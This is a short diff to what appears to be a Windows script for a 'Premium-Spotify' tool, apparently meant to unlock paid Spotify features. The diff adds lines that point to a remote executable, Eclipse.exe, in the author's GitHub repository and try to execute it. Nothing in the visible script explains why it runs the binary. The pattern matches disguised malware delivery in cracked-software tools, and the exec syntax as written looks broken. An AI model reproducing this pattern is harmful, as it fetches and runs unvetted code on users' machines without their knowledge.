@@ -242,6 +242,10 @@ cls
 
 start https://github.com/CodingByLune
 
+'https://github.com/CodingByLune/Premium-Spotify/blob/main/ressource/src/Eclipse.exe'
+
+exec 'https://github.com/CodingByLune/Premium-Spotify/blob/main/ressource/src/Eclipse.exe'
+
 write-host @'
 ***************** 
 IF YOU NEED HELP CONTACT ME ON DISCORD : Lune#6666
